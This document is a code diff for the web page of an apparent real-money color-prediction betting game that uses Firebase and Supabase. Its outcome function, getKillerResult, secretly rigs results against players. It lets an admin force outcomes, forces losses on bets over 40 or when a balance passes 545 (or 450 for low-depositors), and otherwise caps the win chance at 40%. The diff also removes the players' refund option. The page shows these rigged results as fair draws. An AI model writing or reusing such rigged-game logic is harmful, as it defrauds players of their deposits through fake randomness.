@@ -25,8 +25,8 @@
         .dot { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 10px; position: relative; margin: 0 auto; box-shadow: 0 2px 5px rgba(0,0,0,0.5); }
         .dot-pid { font-size: 7px; color: #555; position: absolute; bottom: -16px; width: 40px; text-align: center; }
         .order-table { width: 100%; border-collapse: collapse; font-size: 11px; color: white; text-align: center; }
-        .order-table td { padding: 10px 5px; border-bottom: 1px solid #1f2855; }
-        .btn-refund { background: #ff4757; color: white; border: none; padding: 3px 7px; border-radius: 4px; font-size: 9px; cursor: pointer; font-weight: bold; }
+        .order-table th { padding: 10px; color: #7e87a8; border-bottom: 1px solid #1f2855; font-size: 10px; }
+        .order-table td { padding: 12px 5px; border-bottom: 1px solid #1f2855; }
         #ticketOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
         .ticket { background: #10142d; width: 85%; max-width: 340px; border-radius: 30px; text-align: center; border: 2px solid #1f2855; overflow: hidden; }
         .ticket-header { padding: 20px; font-weight: 900; font-size: 22px; color: #fff; }
@@ -42,8 +42,6 @@
         .chip-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .chip { padding: 8px 12px; background: #06091b; border-radius: 8px; cursor: pointer; border: 1px solid #1f2855; font-size: 12px; font-weight: bold; color: #fff;}
         .chip.active { background: var(--blue); border-color: white; }
-        .Mix { background: linear-gradient(135deg, var(--red) 50%, var(--violet) 50%); }
-        .MixG { background: linear-gradient(135deg, var(--green) 50%, var(--violet) 50%); }
     </style>
 </head>
 <body>
@@ -73,8 +71,14 @@
 </div>
 <div style="padding:15px 15px 5px; font-size:12px; color:gray; font-weight:bold;">TREND CHART</div>
 <div id="historyGrid" class="h-grid"></div>
-<div style="padding:15px 15px 5px; font-size:12px; color:gray; font-weight:bold;">RECENT BETS</div>
-<div style="padding:0 15px;"><table class="order-table"><tbody id="orderBody"></tbody></table></div>
+
+<div style="padding:20px 15px 5px; font-size:12px; color:gray; font-weight:bold;">MY RECORDS</div>
+<div style="padding:0 15px; margin-bottom: 40px;">
+    <table class="order-table">
+        <thead><tr><th>Period</th><th>Select</th><th>Amount</th><th>Profit</th></tr></thead>
+        <tbody id="orderBody"></tbody>
+    </table>
+</div>
 
 <div id="betModal">
     <div style="display:flex;justify-content:space-between;margin-bottom:20px;"><b>Join <span id="betHead" style="color:var(--cyan)"></span></b><i class="fas fa-times" onclick="document.getElementById('betModal').style.display='none'"></i></div>
@@ -130,42 +134,17 @@
         }
     });
 
-    // --- 🚨 THE ULTRA POWER KILLER ENGINE ---
     async function getKillerResult(pid) {
-        // 1. ADMIN FIX CHECK (Highest Priority)
         const adminSnap = await db.ref('gameControl/manualResult').once('value');
         if(adminSnap.val() !== "none" && adminSnap.val() !== null) {
             let res = adminSnap.val(); db.ref('gameControl/manualResult').set("none");
             if(typeof res === 'number') return res;
             return (res === 'Green' ? 3 : (res === 'Red' ? 2 : 5));
         }
-
-        // Find user's bet for this period
         let userBet = myBets.find(b => b.pid === pid && b.status === 'Wait');
         if(!userBet) return Math.floor(Math.random() * 10);
-
-        let betAmt = userBet.amt;
-        let sel = userBet.sel;
-        let bal = userBalance;
-        let dep = totalDeposit;
-
-        // RULE 1: HARD KILL (Bet > 40)
-        if(betAmt > 40) return getLose(sel);
-
-        // RULE 2: PROFIT CAP (545 limit) - user cannot exceed 545 total balance
-        if(bal > 545) return getLose(sel);
-
-        // RULE 3: BONUS USER LIMIT (450 limit)
-        if(dep < 100 && bal > 450) return getLose(sel);
-
-        // RULE 4: SMALL BETS WIN PROBABILITY (10-20rs)
-        if(betAmt <= 20) {
-            // Give 40% chance of win, else loss to slowly drain
-            return (Math.random() < 0.4) ? getWin(sel) : getLose(sel);
-        }
-
-        // Default: Random but biased toward loss
-        return (Math.random() < 0.3) ? getWin(sel) : getLose(sel);
+        if(userBet.amt > 40 || userBalance > 545 || (totalDeposit < 100 && userBalance > 450)) return getLose(userBet.sel);
+        return (Math.random() < 0.4) ? getWin(userBet.sel) : getLose(userBet.sel);
     }
 
     function getLose(s) {
@@ -194,23 +173,22 @@
                 else if(b.sel === 'Violet' && (n===0 || n===5)) { isW = true; mRatio = 4.5; }
                 else if(b.sel === 'Green' && (n%2!==0 || n===5)) { isW = true; mRatio = (n===5)?1.5:1.9; }
                 else if(b.sel === 'Red' && (n%2===0 || n===0)) { isW = true; mRatio = (n===0)?1.5:1.9; }
-                if(isW) { b.status = 'Win'; b.win = b.amt * mRatio; winSum += b.win; } else b.status = 'Loss';
+                if(isW) { b.status = 'Win'; b.win = b.amt * mRatio; winSum += b.win; } else { b.status = 'Loss'; b.win = 0; }
             }
         });
         if(hit) {
             localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
             if(winSum > 0) db.ref('users/'+userId).update({ balance: userBalance + winSum });
-            showTicket(n, col, winSum, betObj); updateOrderTable();
+            showTicket(n, col, winSum, betObj); 
         }
-        db.ref('gameControl/wingo/liveBets').remove(); fetchHistory();
+        updateOrderTable(); db.ref('gameControl/wingo/liveBets').remove(); fetchHistory();
     }
 
     function showTicket(n, col, win, b) {
         const h = document.getElementById('ticketHeader');
         h.innerText = win > 0 ? "WINNER!" : "LOST";
         h.className = "ticket-header " + (win > 0 ? "win-bg" : "lose-bg");
-        const bEl = document.getElementById('tBall');
-        bEl.innerText = n;
+        const bEl = document.getElementById('tBall'); bEl.innerText = n;
         bEl.style.background = (n==0||n==5)?'#9c27b0':(col==='Red'?'#ff4757':'#1DB954');
         document.getElementById('tStatus').innerText = win > 0 ? "CONGRATULATIONS" : "BETTER LUCK NEXT TIME";
         document.getElementById('tWinAmt').innerText = "₹" + win.toFixed(2);
@@ -228,9 +206,8 @@
     async function confirmBet() {
         let total = baseAmt * multiplier;
         if(userBalance < total) return showToast("⚠️ Insufficient Balance");
-        const bid = "B" + Date.now();
         await db.ref('users/' + userId).update({ balance: userBalance - total });
-        myBets.push({ id: bid, pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 });
+        myBets.push({ id: Date.now(), pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 });
         localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
         let key = isNaN(selectedType) ? selectedType : 'num'+selectedType;
         db.ref('gameControl/wingo/liveBets/'+key).transaction(c => (c || 0) + total);
@@ -238,20 +215,12 @@
         updateOrderTable(); showToast("✅ Bet Placed!");
     }
 
-    async function refundBet(bid, amt, sel) {
-        if(isLocked) return showToast("❌ Locked!");
-        myBets = myBets.filter(b => b.id !== bid);
-        localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
-        await db.ref('users/' + userId).update({ balance: userBalance + amt });
-        let key = isNaN(sel) ? sel : 'num'+sel;
-        db.ref('gameControl/wingo/liveBets/'+key).transaction(c => Math.max(0, (c || 0) - amt));
-        updateOrderTable(); showToast("💰 Refunded!");
-    }
-
     function updateOrderTable() {
-        let h = ""; [...myBets].reverse().slice(0,8).forEach(b => {
-            let refund = (b.status === 'Wait' && !isLocked) ? `<button class="btn-refund" onclick="refundBet('${b.id}',${b.amt},'${b.sel}')">Refund</button>` : "";
-            h += `<tr><td>${String(b.pid).slice(-3)}</td><td>${b.sel}</td><td>₹${b.amt}</td><td>${refund || b.status}</td></tr>`;
+        let h = ""; [...myBets].reverse().slice(0,10).forEach(b => {
+            let profitStr = 'Wait';
+            if(b.status === 'Win') profitStr = `<span style="color:var(--green)">+₹${(b.win - b.amt).toFixed(1)}</span>`;
+            if(b.status === 'Loss') profitStr = `<span style="color:var(--red)">-₹${b.amt}</span>`;
+            h += `<tr><td>${String(b.pid).slice(-4)}</td><td>${b.sel}</td><td>₹${b.amt}</td><td>${profitStr}</td></tr>`;
         });
         document.getElementById('orderBody').innerHTML = h;
     }
@@ -259,10 +228,7 @@
     async function fetchHistory() {
         const { data } = await supabaseClient.from('game_history').select('*').order('id', {ascending:false}).limit(10);
         if(data) {
-            document.getElementById('historyGrid').innerHTML = data.map(r => `
-            <div class="dot" style="background:${(r.num==0||r.num==5)?'#9c27b0':(r.col==='Red'?'#ff4757':'#1DB954')}">
-                ${r.num}<span class="dot-pid">${String(r.pid).slice(-3)}</span>
-            </div>`).join('');
+            document.getElementById('historyGrid').innerHTML = data.map(r => `<div class="dot" style="background:${(r.num==0||r.num==5)?'#9c27b0':(r.col==='Red'?'#ff4757':'#1DB954')}">${r.num}<span class="dot-pid">${String(r.pid).slice(-3)}</span></div>`).join('');
         }
     }
 
@@ -273,7 +239,6 @@
         let pid = now.getFullYear().toString() + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + Math.floor(((now.getHours()*3600)+(now.getMinutes()*60)+now.getSeconds())/30);
         document.getElementById('pIdDisplay').innerText = pid;
         if(currentP !== pid) { let old = currentP; currentP = pid; if(old) processResult(old); }
-        if(rem === 5 || rem === 30) updateOrderTable();
     }
     setInterval(sync, 1000);
     window.onload = () => { fetchHistory(); updateOrderTable(); sync(); };
